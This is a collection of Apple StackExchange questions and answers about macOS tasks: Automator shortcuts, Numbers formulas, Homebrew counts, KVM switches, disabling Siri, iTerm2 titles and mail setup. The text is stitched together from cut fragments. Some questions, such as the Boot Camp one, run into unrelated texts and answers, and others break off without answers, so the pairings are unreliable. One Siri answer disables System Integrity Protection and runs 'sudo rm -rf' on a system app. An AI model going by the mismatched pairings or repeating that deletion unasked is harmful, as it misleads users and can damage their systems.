wanting to copy\n\n*Once again in the second column containing the long list, find \"Copy Finder Items\" and double-click on it\n\n*Save the service using a meaningful name (e.g. Duplicate Design Kit).\n\n\nNow to the next step.\n2. Creating your shortcut\n\n\n*\n\n*Go to System Preferences > Keyboard > Shortcuts\n\n*Select Services from the sidebar\n\n*Find your service (it'll be in the list on the right-hand side)\n\n*Add a shortcut by double clicking on the service name\n\n*Now go to System Preferences > Security & Privacy > Privacy\n\n*Select Accessibility in the sidebar\n\n*Click on the + sign (you may need to unlock the padlock if it's locked)\n\n*Add Automator\n\n*Add Finder (to find this you will need to navigate to /System/Library/CoreServices/Finder.app).\n\n*Exit your System Preferences.\n\n\nNow you should be able to do two things:\n1. Run the service from any application by going to the Services list within any Application menu (e.g. Finder > Services, Safari > Services, TextEdit > Services, etc) and select the service you just created. \n2. Use the keyboard shortcut to run the service.\nLet me know how you go.\n[UPDATE]\nFor an unknown reason the OP found that he needed to restart his Mac before the Service was available.

I have a Numbers file containing some rows with machine learning predictions and also what the actual values were. The first column contains an unique ID, the second column contains the actual values, the following columns contain the predicted values. \nPer column I would like to count the number of times the predicted value was correct, so the amount of rows where the predicted value matched the actual value from the other column.\nI'd like to add a row add the end of the data where I display this amount of correct values per column, and also what the accuracy would be (correct values/total values).\nI tried using the COUNTIF function for this, but get errors every time.\nThis is what I tried e.g. =COUNTIF('Random Forest', '=Echte waarde') or =COUNTIF(C2:C100, '=B2:B100')\nAnybody know what the correct syntax would be to achieve such a function? Thanks!\n\n\nA: Unfortunately Numbers doesn't support all the functions etc that Excel does, so using a SUMPRODUCT to do this in the same way you would in Excel isn't going to work.\nI was hoping someone else may offer you a more elegant solution than the ones I offer here (I much prefer MS Excel and aren't very familiar with using Numbers). However, since you don't have another answer yet, I'll offer a couple of not so elegant ways for you to achieve what you want.\nMethod 1: Count the number of highlighted cells\nSince you're using Conditional Highlighting (as opposed to having just manually shaded your cells), you can actually use a formula to count how many of them are shaded.\nUnfortunately, I can't just now think of a way to do this while you have both sets of shading, so you'd need to remove the Conditional Highlighting for the wrong results (i.e. have no red shading).\nOnce you've done that, then:\n\n\n*\n\n*Add a row at the end of your data\n\n*At the bottom of Column C (i.e. your Random Forest column) enter the formula: =COUNTIF(C2:C29,TRUE) (Note: Change C29 in this example to reflect the last row of Column C containing data.)\n\n*Now you should have a numerical value displayed to indicate how many cells in Column C were shaded with your Conditional Highlight\n\n*Repeat Step 2 for the bottom of each of your Columns by adapting the formula as necessary\n\n\nAs you can see, the above process counts the number of correct values in your data. Of course, once you have these values, you can then go ahead to add another row to calculate your percentages.\nMethod 2: Use additional columns to do the grunge work\nAnother way to do what you want is to first use another column to compare the values between the actual and predicted values and then to count the number of instances you get a TRUE result.\nSo, for example, you could:\n\n\n*\n\n*Label Column L as Random Forest Check and at cell L2 enter the formula: =C2=B2 \n\n*Based on your question you should get the result TRUE in that cell\n\n*Now copy the formula down Column L so that each cell displays either a TRUE or FALSE value\n\n*Add a row at the end of your data\n\n*Now at the bottom of Column C (i.e. your Random Forest column) enter the formula: =COUNTIF(L2:L29,\"TRUE\") (Note: Change L29 in this example to reflect the last row of Column L containing data.)\n\n*Now you should have a numerical value displayed to indicate how many times the value TRUE appears in Column L.\n\n\nAs you can see, by using the above process you will be able to count the number of correct values for your Random Forest column. You would then need to repeat the same process for each of your columns (e.g. use Column M for checking your Neural Network results, and so on). Then, once you have your values, you can then go ahead to add another row to calculate your percentages.\nFinally, if you wanted to hide the extra columns, you can just go ahead and do that. Doing so will not prevent the COUNTIF formulas from calculating.\n\nA: Late in the game here, but one can fairly easily do these things with the concatenate function set inside the CountIf().  Just create the concatenated string to setup the required formula.\n", "Q: How can I determine the current brew package count? I tried to get the number of available brew packages by running\nbrew search | wc -l\n\nbut I don't know how accurate this really is. What do I need to take into account to get a more correct number?\nPS: macports lists 19,889 packages online here\n\nA: On June 23, 2019 the soon to be incorrect count of packages is 4804.\nSince many people add and remove packages, this count shifts by dozens a day and sometimes hundreds at a time when larger changes move packages out of the mainstream repository into a sub repository that can be \"tapped\" to increase the count.\nHomebrew uses a concept called tap, which is simply a repository containing a list of formulae that it tracks, updates, and installs from. The default installation of Homebrew comes with a tap called homebrew/core but there's no limit to how many or how large a tap you could source packages since they can be self hosted pretty much anywhere.\nRunning brew [command] [options] runs the command on homebrew/core tap. There are various other official and unofficial taps from which packages can be installed.\nThe total count of packages in any tap keeps changing as new packages (called formula) are added, deleted or updated. To get the current count, first update the local homebrew/core tap repository by running:\nbrew update.\nNow execute your command-line:\nbrew search | wc -l\nto get the current count of packages in the homebrew/core tap. Running brew search without any arguments lists all the packages (formula).\n", "Q: Best way to share one keyboard and mouse between a Mac & PC? I have a Mac and pc sitting beside each other. Each has an independent monitor. Currently I am using a two port usb switch to move between the two systems, but it can sometimes be cumbersome to switch between the two quickly. Anyone have any other suggestions for ways to switch between the two systems?\n\nA: I have never used it, but you can give Synergy a try. It shares keyboard and mouse on one system with one or more systems using software. It works on macOS, Windows and Linux.\n\nA: After @Ömer Rıfat Kuldaşlı posted Synergy I also found something called ShareMouse. Not sure which is the best so far.\n\nA: Sharemouse has considerable lag, I can't recommend it.  I've been using  J5 Create JUC400 Wormhole Switch for years.  About 90% of the time it is great.  The other 10% it will make you tear your hair out.  Having just upgraded to a new Mac I may take this opportunity test Synergy.  But if you don't mind the occasional problems, the J5 unit is pretty awesome.  Joe Bob says check it out.\n\nA: I have an old Belkin OmniView KVM switch which I used to use to share one keyboard, monitor and mouse between a few machines. Unfortunately, it was only for the older VGA connectors, not the newer DVI/DP/HDMI type. However, I found later after I moved to DVI that it did support swapping the USB connector for the keyboard and mouse despite there being no VGA connections.\nI would imagine that if you're fine with the two separate monitors and thus the video connector doesn't matter, you could find an older KVM on craigslist/ebay fairly cheap and just use the keyboard/mouse switching.\nThe only problem you'll run into is that the numeric keypad, Command, Alt Menu and Windows keys don't quite map the same between the platforms (e.g. the Command key becomes the Windows key which can be annoying to muscle memory of copy/paste functions). But a keyboard remapping can solve most of this.\n", "Q: Install Windows7 into Bootcamp (using mid-2011 iMac) I am having a hard time getting Windows 7 to install on my iMac 2011.

The nature of the flicker is \"on/off\", i.e.  the screen gets completely black for a split second (sometimes a few seconds) and it goes back on.

It seems similar issues are common, but I have not yet found a common explanation to fix these things. Needless to say, I have tried the standard things, like various resets etc.\n\nA: Rebooting my MacBook with both monitors plugged in actually fixed the second monitor flickering issue. Yay.\n\nA: Sounds to me like it might be an SMC issue - at least that’s one of the first things I would try - reset the SMC.\nEasy enough to do...\nhttps://support.apple.com/en-us/HT201295\n\nA: Had this issue once - the solution is to make sure that all the monitors are set to the same refresh rate (Display Settings -> Advanced Display Settings).\nIn my case, I had 2 identical HD external monitors with the same refresh rate but not compatible with my laptop's which I was extending. I made sure both monitors were set to the same refresh rate and turned off the third (laptop's) monitor in the display settings.\n", "Q: Sierra / Mail.app workaround for missing \"Display in Place / Display as Icon\" choices? The \"Display in Place / Display as Icon\" choice in Mail.app (accessed via a right-click), previously removed from High Sierra, has now also disappeared in Sierra running Mail.app 10.3. \nIs there a workaround? I have a 160K one page .pdf attachment that I'd like to display in full.\n\nA: A successful workaround is displaying the visa on your computer, taking a screenshot (command + shift + 4) of the image, and attaching the screenshot to the email. In this case, the screenshot displays fully, showing the image within the email.\n", "Q: High Sierra- Partition error I have boot camped the Mac to have windows. I had an issue so deleted windows during setup to reinstall on the partition. In this process I think I have lost my recovery for Mac as its just all fallen apart from there.\nSo gone into disk utility to delete the partition to restart it now I am not seeing the partition at all and when I try to resize the Mac one its not allowing me too as it comes with an error that it cannot find the other partition that windows was on. \nNow I tried to do a full reset using command R and do the internet one but I get stuck on the apple sign after that so have to restart. If I was to boot the Mac to single mode using command s it takes me to the black screen no bootable device found please insert disk well something like that. Even tried to do clean install of windows but it gets to partition bit it says that partition is formatted in a different way it won't work on it. \nWhen I open finder under devices I have remove disc so I am assuming this is the partition that I've screwed up. I may have overlooked something but guys what can I do?\n\nA: Have you tried all startup commands to try to get to the recovery screen? One of these should get you out of the black screen.\nCommand+R\nCommand+Option+R\nCommand+Shift+Option+R\nOr\nJust the option Key\nHopefully you will get into recovery mode to use terminal.\n- Open Terminal and type the following command (without quotes) “diskutil list”\n-Terminal should give you a breakdown of the disks and volumes that are currently on your Mac that you may not see in disk utility.\nAnyway you can post the picture of diskutil list?\nAlso what Mac version do you have?\n", "Q: How do you disable Siri permanently on macOS Sierra (10.12.6)? I work in security as an intern, and I've been asked by my boss to look into disabling Siri on macOS Sierra. I noticed that there's no way to prevent users from re-enabling Siri even if it's disabled by an administrator.\nI've tried using \"csrutil disable\" in Recovery Mode and editing Siri's .plist files, but it seems to have no effect. Is there any way to completely prevent any user from running Siri on macOS Sierra?\n\nA: It is not my work but Rich T. has a great post on this at his blog:\nhttps://derflounder.wordpress.com/2016/09/20/blocking-siri-on-macos-sierra/\nYou will need to deploy two separate configuration profiles, the relevant keys are below:\nDomain: com.apple.assistant.support.plist \n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Assistant Enabled</key>\n    <false/>\n</dict>\n</plist>\n\nand\nDomain: com.apple.Siri.plist\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>StatusMenuVisible</key>\n    <false/>\n    <key>UserHasDeclinedEnable</key>\n    <true/>\n</dict>\n</plist>\n\nDepending on how you manage your macs, and how you want to deploy these profile settings they may need to be constructed differently.\nAs far as I know these two profiles are the only way to disable this.\nHere is a link to the mobileconfig profiles for these settings. You can deploy them with any MDM:\nhttps://github.com/rtrouton/profiles/tree/master/DisableSiri\nOtherwise you will need to use defaults write:\ndefaults write com.apple.Siri StatusMenuVisible -bool false\ndefaults write com.apple.Siri UserHasDeclinedEnable -bool true\ndefaults write com.apple.assistant.support 'Assistant Enabled' 0\n\nOnce you make these changes you will need to clear the preference cache:\nsudo killall -HUP cfprefsd\n\nAnd then restart the WindowUI server:\nsudo killall SystemUIServer\n\nHope this clarifies.\n\nA: I figured it out with the help of Edward S.\nFirst, you need to reboot into Recovery Mode and run the command\ncsrutil disable\n\nto turn off System Integrity Protection, which will allow you to edit all plist files.\nThen, after rebooting, run the following:\nsudo defaults write /System/Library/LaunchAgents/com.apple.Siri.plist Disabled -bool true\nsudo defaults write com.apple.Siri StatusMenuVisible -bool false\nsudo defaults write com.apple.Siri UserHasDeclinedEnable -bool true\nsudo defaults write com.apple.assistant.support 'Assistant Enabled' 0\n\nto set system defaults and\ndefaults write com.apple.Siri StatusMenuVisible -bool false\ndefaults write com.apple.Siri UserHasDeclinedEnable -bool true\ndefaults write com.apple.assistant.support 'Assistant Enabled' 0\n\nfor every user currently on the Mac. Future users will copy the system defaults.\nThen run\nsudo killall -HUP cfprefsd\nsudo killall SystemUIServer\nsudo reboot now\n\nGo back into Recovery Mode and run\ncsrutil enable\n\nReboot, log back in again, and try to run Siri. The process will run, but it won't do a thing.\n\nA: It turns out an entirely different solution to what I expected is what actually works. It doesn't require you to change any settings at all. Simply reboot into Recovery Mode, open a terminal, and type:\ncsrutil disable\n\nto disable System Integrity Protection. Reboot as normal, and then run\nsudo rm -rf /System/Library/CoreServices/Siri.app\n\nto disable Siri. Try to run it and you'll see it won't work. But we're not done yet. MAKE SURE to re-enable System Integrity Protection by rebooting one more time into Recovery Mode and running:\ncsrutil enable\n\nand then rebooting.\nCongratulations! You've just disabled Siri!\nIn the case that this doesn't work, implement both this and the .plist modifications I mention in my earlier answer.\n", "Q: Dock - Remove spacer? Is there a way to remove the spacer between the downloads stack and apps?\n\n\nA: As far as I know, this is not possible through normal means. And by that I mean I doubt you could change this without hacking the OS.\nI know you can add spaces:\nAdjust width of spacer between Mac OS dock icons\ndefaults write com.apple.dock persistent-apps -array-add '{\"tile-type\"=\"small-spacer-tile\";}' && killall Dock\n\nor \ndefaults write com.apple.dock persistent-apps -array-add '{\"tile-type\"=\"spacer-tile\";}'\n\nThose are the only space customizations I am aware of.\nI know this is not the answer you were hoping for but I believe it to be the correct answer.\n\nA: \"long click\" on space in the dock .  a little window appears to delete the space\n", "Q: How can I set the iTerm2 window title to be the same no matter which pane is selected? I'm aware that the iTerm2 window title can be set with\necho -ne \"\\033]0;\"Title goes here\"\\007\"\n\nbut that appears to only set the title for a single pane. When I switch panes, the window title is changed.\nHow can I quickly/automatically set the window title to be the same for every pane?\n\nA: If you are just looking for a static title you can add that line to your ~/.bash_profile. Just be sure to source it to load it:\nsource ~/.bash_profile\n\nOtherwise you could use an alias. Those are also added in your ~/.bash_profile as well:\nalias title1='echo -ne \"\\033]0;\"Title goes here\"\\007\"'\nalias title2='echo -ne \"\\033]0;\"Other Title goes here\"\\007\"'\n\nHope that helps!\n\nA: In the end I solved this by adding the following lines to my .bashrc.\n# Private variables\n_title_file=$HOME/.title\n_win_num=${TERM_SESSION_ID%%t*}\n_win_num=${_win_num#w}\n\n# Record title from user input, or as user argument\n_title_set() {  # default way is probably using Cmd-I in iTerm2\n  [ -z \"$TERM_SESSION_ID\" ] && return 1\n  if [ $# -gt 0 ]; then\n    _title=\"$*\"\n  else\n    read -r -p \"Window title (window $_win_num):\" _title\n  fi\n  [ -z \"$_title\" ] && _title=\"window $_win_num\"\n  [ -e \"$_title_file\" ] || touch \"$_title_file\"\n  sed -i '/^'\"$_win_num\"':.*$/d' \"$_title_file\"  # remove existing title from file\n  echo \"$_win_num: $_title\" >> \"$_title_file\"  # add to file\n}\n\n# Retrieve title from the hidden file\n_title_get() {\n  if [ -r \"$_title_file\" ]; then\n    _title=$(grep \"^$_win_num:.*$\" \"$_title_file\" 2>/dev/null | cut -d: -f2-)\n  else\n    unset _title\n  fi\n  _title=$(echo \"$_title\" | sed $'s/^[ \\t]*//;s/[ \\t]*$//')\n}\n\n# Update the title\n_title_update() {\n  _title_get  # set _title to existing window title if possible\n  [ -n \"$_title\" ] || _title_set  # set title name\n  echo -ne \"\\033]0;$_title\\007\"  # re-assert title, in case changed\n}\n\n# Add a prompt command\n_prompt() {\n  export PROMPT_COMMAND=$(echo \"$PROMPT_COMMAND; $1\" | sed 's/;[ \\t]*;/;/g;s/^[ \\t]*;//g')\n}\n\n# Ask for a title when we create pane 0 (i.e. the first pane of a new window)\nalias title='_title_set'  # easier for user\n[[ \"$PROMPT_COMMAND\" =~ \"_title_update\" ]] || _prompt _title_update\n[[ \"$TERM_SESSION_ID\" =~ w?t?p0: ]] && _title_update\n\nThe above lines will ask you to input a title when a new window is created (with the default as \"window n\"), and updates the title every time a prompt is generated. You can manually change the window title by calling title <new_title> inside the desired window.\n\nA: If you go to iTerm2/Preferences/Appearance there is an area on the right side of the window where you can define names and what appears on the tabs or window. You should be able to play with these settings to get an acceptable result.\n", "Q: Should PS1 be defined before exported in .bash_profile?

Disk Utility doesn't find any error. \n\"Free space\" isn't displayed in Windows disk manager, instead the previous partition is displayed with its size before shrinking.

To be fair, it's difficult in a GUI for the app to figure out exactly what you want to do.\nI can't see the container list in the left pane of Disk Utility but I'm assuming that \"APPLESSD\" is living in an APFS container all of it's own. To reclaim that space you need to \"grow\" that container to gobble it up.\nThis page has a fair explanation of the process.\nWith APFS you are actually better to add a volume to the container rather than partition it. All the volumes in a single container share the space so you don't need to worry about getting the size wrong and adding and deleting volumes is a trivial task. Once your container is back to the right size select it in the left pane and then \"Add APFS Volume\" in the Edit menu.\n", "Q: How does Disk Utility wipe the disk it's executing on? Maybe I am misunderstanding the functionality as a whole but how does Disk Utility wipe the disk it's executing on? For example, if you were to erase yourself there would still be a hand left.\n\nA: Disk Utility won't erase the partition from which your Mac boots.\nDon't be confused by your ability to erase the boot \"drive\" while in Recovery mode. You are actually booting off a different partition on the same drive, one that is hidden, and this allows you to erase the boot partition.\n", "Q: Is it safe to install youtube-dl on my Mac?

I realize that there are no shortcuts specifically for the Settings program on iOS.

Surprised, I looked in Keychain Access to see if there was anything wrong as I had setup git to use git-credential-osxkeychain. I freaked a little when I saw that there were no references to git at all. I went to log onto the GitHub site and found that my password wasn't working either. After calming down from a I've-been-hacked-panic-attack I saw that Github had sent me an email that they had to reset some users passwords due to an internal error. Annoying but OK.\nHere's the question: Is it possible for a service like git-credential-osxkeychain to delete keys from a keychain? Could this have been done by Github from their end somehow?\nI ask as I went back to my backups of my keychain file and the old Github key is in there, and I definitely didn't manually delete it.\n\nA: Yes, git-credential-osxkeychain can delete the GitHub entry in your KeyChain. It will do that when it gets a failed authentication, I've had it happen to me.\nI'm not sure it's a good idea, but I understand the reason. It has the access to do it and it's not like it serves any purpose any more. \nGitHub can't do it from their end, they don't have the permissions over your KeyChain.\n", "Q: High Sierra Macs always connect to file server with AppleID, not the correct username/password I ran into a really annoying problem yesterday. In a small office of just three workstations (and two more that connect remotely), the computers cannot automatically connect to the fileserver on boot. Instead of using the username/password associated with the shared folders, it automatically connects using the AppleID, which works because the server uses the same AppleID. The server is a Mac mini running High Sierra also.\nSo let me explain. In the past, sometimes this would happen, where you would click on a shared Mac and it would sometimes try to auto-connect as the same user you are using on the current computer, or using the AppleID. But you click disconnect, then reconnect, and type in the correct username and password. Checking the box to remember the password. Once the volumes are mounted, you save them to the dock, you put them in the \"Login Items\" folder, and BAM auto-mounting network shares. \nBut now that does not happen. Now no matter what, it connects to the server using the AppleID. So the shares will be working perfectly. Then when you reboot, it auto-connects with the AppleID not the username. Under the AppleID, the shares are either not available or available but as read-only. \nThis is a pain in the ass for me, a tech person. But for \"regular\" people using the file server, this is a huge hassle. I'm pretty sure they don't even understand what the problem is when I explain it. They made a whole list of all the problems they are having with the new server, not realize that every single item on the list is exactly the same, \"can't write to files on the server\". It needs to be seamless and easy to use, something Apple excelled at once upon a time. \nAddon: Also, one of the work stations is still on El Capitan and it does not have this problem. It seems to be a \"feature\" of High Sierra. (No Sierra Macs to test on)\n\n\n\nA: I see that this post is one year old but I noticed the same issue today.\nFinally, I found out that the issue is related to the iCloud Keychain.\nI created a fresh new account on my computer and connected to my server from this account : my server username was displayed.\nThen I connected iCloud with my AppleID in the test account. After that, the server connection was still displaying my server username. After activating the iCloud Keychain service, there was still no issue.\nBut, after enabling the iCloud Keychain AND checking the \"keep login in my keychain\" option at the server login, the server connexion is now displaying my AppleID.\nI think it's a bug in macOS but it's pretty annoying as you can no longer know which username is used for the connection.\n", "Q: Where does Apple App Store download security updates to? My problem is that my internet speed to Apple's server is very slow, and I have 6 devices running macOS so I like to download security updates or system updates only once for all 6 of my devices.\nI checked these folders:\n$TMPDIR../C/com.apple.appstore/\naka\n/var/folders/mp/???/C/com.apple.appstore\n\n~/Library/Caches/storeaccountd\n~/Library/Caches/storeassetd\n~/Library/Caches/storedownloadd\n~/Library/Caches/storeinappd\n\nThe package is not in either of these folders...\nAlso, once the file is downloaded and installed, App Store removes the package immediately it seems. Is there a way to prevent App Store from removing updates?\n\nA: First off: did you consider \"Content Caching\" in High Sierra's System Preferences > Sharing?\nBut to answer your question: while downloading you'll usually find the files in the system caches in the... \n/private/var/folders/zz/\n\n...folders (owned by _softwareupdate or/and _nsurlsession, with no access to the user).  But that's just a temporary state and they usually get assembled in numbered directories into...\n/Library/Updates/\n\nSince updates consist of more packages these days, they refuse to run individually and the .dist file will have to be opened with the Installer.app to install them in order.\nThe packages will wait for installation, before being removed, so making sure System Preferences > App Store is set to not automatically update and clicking \"Not Now\" before the download, or \"Later\" in the installation window will postpone installation and therefore removal.\n\nA: If you need to update multiple Macs then you may be better off to bypass the Mac App Store app and download updates manually. The safest way to do that is directly from Apple.\nTo do this, use your browser to go to: https://support.apple.com/downloads\nOnce there you'll see the most recent software updates available for download. However, you can also use the icons at top of the page to browse downloads by product. \nUsing the example in your question, you can click on the macOS icon to filter the list by macOS downloads. Doing this will provide you with access to Security updates, combo updates, etc relating to macOS.\nYou also have the option of using the Search field to search for a specific download. For example, entering Security update as a search term will present you with Security Updates going back to 2003.  You can also search for specific updates relating to OS versions or Apple hardware. \nTypically downloads will be in the .dmg disk image format and you can then keep and use these as required.\nFinally, if you're going to manually download updates, you may want to consider reviewing you settings in Apple > System Preferences > App Store.\n", "Q: How do I make macOS properly blacken my TV screen on standby I have a Mac Mini connected to a Sony W755C TV by HDMI. If I put \"Set display to sleep\" on the Mac, the TV goes to black but displaying a very unsightly OSD text \"HDMI 1 (Clock) No input. Check your cables, etc.\" which stays on forever, until I power the TV off manually. I can't find any menu items in the TV to remove the OSD, which just looks ugly on the huge TV in my living room.\nSo I tried to use the TV's own \"standby if inactive for n hours\", but \"inactive\" for the TV means not fiddling with the remote, which I only use for ON/OFF. The TV is oblivious to what's going on on the Mac. So it will suddenly suggest to sleep in the midst of a movie, which is obviously annoying.\nIs there any way I can make the TV either a) go to standby modus without any OSD text, or b) soft-power off (same as pressing OFF on the remote -- which is not full power off, mind you...)\n\nA: The message \"HDMI 1 (Clock) No input. Check your cables, etc.\" is apparently generated by your TV.  The first place I'd look is in the TV's menu system.  See if there's any way to change what is displayed when there is no incoming HDMI signal.\nIf you can't find anything there, you can look at the Sony website.  Note that there's a firmware update available for you TV as well.  There's a chance you'll be able to control the \"no input\" message more easily after the update.\nhttps://www.sony.co.uk/electronics/support/televisions-projectors-lcd-tvs-android-/kdl-43w755c#manuals\nBut, what you really want, I think, is to set up the Mac Mini so that it shows a blank image as its screensaver.  \n\n\nA: Another way to approach this is to try (again?) to set up the TV to shut down when the HDMI signal goes down.  It may not be possible with your model, and I see where some Sony TV owners are complaining about that.  I did find an answer that has a chance of working for you, but I found it through an archive of a forum page, so I'll just copy and paste the (paraphrased) excerpt:\nThere is a setting on some Sony TVs called Auto Shut-off wherein the unit will turn off when no input signal is detected for 15 minutes. To access the Auto Shut-off setting follow these steps.\n\n\n*\n\n*Press the Home button on the supplied remote. \n\n*Press the Right or Left arrow button to go to Settings. \n\n*Under Settings select Preferences.\n\n*Under Preferences select Eco. \n\n*Select Auto Shut-off then set it to On.\n\n\nA: If you have your Mac mini go into \"display sleep\" after n minutes (System Preferences > Energy Saver), almost all TVs will automatically go into standby mode once they stop getting a video signal.  \n\n\nA: I have accomplished this on my 2018 Mac Mini and my Sony KD43X720E TV by using a Raspberry Pi Pico connected to an IR LED, so it send the remote commands just like the Sony remote. I wrote Python code for the Pico and the Mac. The Mac code runs as a daemon, and detects sleep. It also detects if I hit the volume up/down and mute keys, and commands the Pico through USB ( which also powers it ) to send those IR remote commands.\n", "Q: macos screen locks while I am working Lately my Macbook Pro switches to the \"Lock Screen\" page out of nowhere while I am working. When I say \"while I am working\" I want to make clear it's not due to inactivity, I am actually using the computer as it happens.\nIt does not log me out (none of my windows are closed), it only locks.\nI've noticed it happens usually shortly after I've logged in. So for example it's morning, I login start doing things then a few seconds later I'm locked out. I log back in, and again a few seconds later I'm locked out. It happens 2 or 3 times before it quiets down.\nmacOS High Sierra 10.13.4\n\nA: Perhaps you have hot corners turned on and are touching the edge of the screen with your mouse?\n\nA: It is likely that accidentally the lock screen keyboard shortcut, i.e. Control + Command + q is getting invoked.\n\nIt could be either you pressing the key sequence unknowingly or, one or two of the keys from the combination is stuck and pressing the third key by chance is invoking the sequence.\nTo resolve this issue, shut down your MacBook Pro, and repeatedly tap on each of the keys in succession and try to unstuck them. They turn on the MacBook Pro, resume your work and see if the problem goes away.\n", "Q: One USB-port on MacBook Pro late 2011 doesn't work. I have a problem with one of my USB-ports on my Macbook. I can plug in my charger for my Jaybird X3 headphones and charge them, but I can't charge my iPhone for example. And no data from the iPhone is getting transfered to the computer. I've dropped it with an usb-device connected, and that's when it stopped working correctly. Is there any way to bend some connector back or something like that?\n\nA: So, the first thing that different devices will tax the USB port differently. The Jaybird headphones likely requires less wattage than the iPhone to charge which is why the damaged port works for some devices but not others. \nGiven that you are not getting full power output and data transfer is not working it sounds like the connectors on the inside of the port are bad (as you alluded to in your question). \nYou did not state a year for your MacBook Pro but on pretty much all modern models the USB ports contacts reside embedded in a bit of plastic, and the actual connectors are soldered directly onto the main board. If you had skills with soldering etc you might be able to take the machine apart and fix the port, but this would void any warranty you may have.\nMy recommendation would be to take it into the Apple Store and have them take a look at it. I would guess you will need a new logic board. Apple will give you a price and you can decide from there if you want to:\n\n\n*\n\n*Have Apple fix it\n\n*Take to a 3rd party to fix (cheaper but not Apple parts)\n\n*Try and fix it yourself\n\n*Buy a new machine\n\n*Live with the issue and just use the other ports\n\n\nHope this helps!\n", "Q: Restore path to be read from /private/etc/paths I used the how to from \nhttps://docs.aws.amazon.com/cli/latest/userguide/cli-install-macos.html\nto install AWS CLI on macOS.\nAfter executing command source ~/.bash_profile it seems that my default PATH location from file /private/etc/paths was lost.\n/private/etc/paths file content:\n/usr/bin/vim /private/etc/paths\n\n/usr/local/bin\n/usr/bin\n/bin\n/usr/sbin\n/sbin\n\n~/.bash_profile file content:\n# Setting PATH for Python 3.6\n# The original version is saved in .bash_profile.pysave\nPATH=\"/Library/Frameworks/Python.framework/Versions/3.6/bin:${PATH}\"\nexport PATH\n\nFor example next command cant find the location of basic files installed in /usr/bin/:\n-bash: vim: command not found\nIs it a way to restore path to be reading from /private/etc/paths?\necho $PATH\n/Library/Frameworks/Python.framework/Versions/3.6/bin:/Users/<myusername>/bin:/Library/Python/3.6/bin/\n\nAlso I can't use the same command to reread from the location\nsource /private/etc/paths\n-bash: /usr/local/bin: is a directory\n-bash: /usr/bin: is a directory\n-bash: /bin: is a directory\n-bash: /usr/sbin: is a directory\n-bash: /sbin: is a directory\n\n\nA: *\n\n*Fix your /private/etc/paths content:\nThe default content is:\n/usr/local/bin\n/usr/bin\n/bin\n/usr/sbin\n/sbin\n\nIf you want to include /usr/bin/vim (but only if vim is a folder containing some executables - the macOS installed vim exec is /usr/bin/vim!) modify the content to:\n/usr/local/bin\n/usr/bin/vim\n/usr/bin\n/bin\n/usr/sbin\n/sbin\n\n\n*You have another (superior) export PATH line somewhere (i.e. bash config files) with the following content:\nexport PATH=\"/Users/<myusername>/bin:/Library/Python/3.6/bin/:*\"\n\nwith *= either completely missing or a falsely defined PATH variable (e.g. Path instead of PATH)\nAt least it doesn't inherit the standard paths defined by /private/etc/paths\nThis first PATH export and the second in your ~/.bash_profile then yield something broken like:\n/Library/Frameworks/Python.framework/Versions/3.6/bin:/Users/<myusername>/bin:/Library/Python/3.6/bin/ \n\nas PATH\n", "Q: Preview fails to open pdf with \"The file couldn't be opened because you don't have permissions to view it\". but I have these permissions I've seen this earlier but never got time to bother looking closely into the problem.\nSo when I open a pdf file I created (long time ago, though in 2014).

It also occurs trying to save a new file.  \nThe work-around both for an existing file that Preview wouldn't itself open, as well as for a new it says it can't save [which it actually already has saved], is this: navigate to the file in Finder and open via Cmd-O.  Then, back in Preview, click 'Cancel' and it will then proceed as if nothing strange occurred.  \nIt's Apple's version of SNL's Rosanna Rosannadanna's 'Nevermind...' \nThis thread. suggests it's a permissions problem, and the referenced Apple Support page gives directions to apply permissions to the user folder via Get Info, then reset permissions in Terminal.\nImmediately after I did this, Preview would save a screenshot, but shortly thereafter the same problem recurred.  It doesn't always do it.\nMy feedback to Apple when the 'fix' did not work was to point out that they just deflected the question.  I asked they address what to do when it didn't work.\nIt might be one of hundreds of OS issues Apple doesn't know how to fix.

Since then my email account with 1&1 (that was previously working fine) - decided to work intermittently, then just failed completely. I contacted 1&1 and they couldn't help, saying I was using the right login credentials. They even screen shared and were still none the wiser and said it must be an internal problem.\nI deleted the account from Mail.app and tried to Add Account - but it just says Unable to verify account or password. If I ignore that and just carry on filling in the appropriate fields, I get another window Select the Apps you want to use with this account. I check Mail and press next and there's spinning beachball connection icon for a split second and then nothing happens.\nHow do I get my mail account with 1&1 to work again with Mail.app?\n\nA: I had the same problem. The solution was in the Mail app itself to go to Preferences, select Accounts, and to enter the complete email myname@myisp.de as user name for my IMAP account.\nI also had to change the port for IMAP to 993 and for SMTP to 465 (for secure connections via SSL.)\n", "Q: Re-start an app game from zero I bought a new iPad and my wife is taking my old Mini. She really likes \"Word Collect\", but wants to start at the beginning, not at my level. I deleted the app, deleted the backup, but when I reload the game from iCloud it comes in at my old level, not zero.\n\nA: She probably needs to use her own iCloud account, not yours, to download the game. \nYou probably should also completely execute the Erase All Content and Settings command in Settings > General > Reset and start her off with a completely 'new' iPad and configure it for her use.\nIf you don't, she'll be using all your settings and data, which is why the game reverts to your level in the game.\n", "Q: Can I transfer 100 PDFs files from Windows to Acrobat Reader on iPad without going through iTunes?

She called me the other night claiming the battery died and her macbook crashed, and when she restarted and went to login, her normal password stopped working at login. I confirmed this by coming over and trying myself. Restarting also occasionally yields a flashing folder with a question mark, or a prohibition symbol. But most times it goes to the login screen (with her profile picture), and entering her password does not work. She does not care about backing up local data and she does not have a time machine recovery.\nHere are all the steps I have taken:\n\n\n*\n\n*I made sure her keyboard layout isn't Dvorak or some other language, it is indeed U.S and her regular password does not work anymore on login (if it gets there without the prohibition sign/flashing folder)\n\n*I booted to recovery and checked out Disk Utility, where the only disk listed is the 2 GB OS X Base System underneath the Apple disk image. This raises some red flags, as her internal 256 GB hard drive is nowhere to be found in disk utility.\n\n*I booted into internet recovery and attempted to re-install OS X El Capitan, however going through the prompts I reach a dead end where it asks me to \"Select the disk where you want to install OS X\". There are no disks listed. Disk Utility in internet recovery also does not list any disks. \n\n*Clicking Startup Disk underneath the apple sign further confirms that there are no available startup disks.\n\n*I held the option key on booting, (not sure the name of this mode), pressed Macintosh HD and was greeted by the flashing question mark folder.\n\n*I held 'D' on booting, which I believe 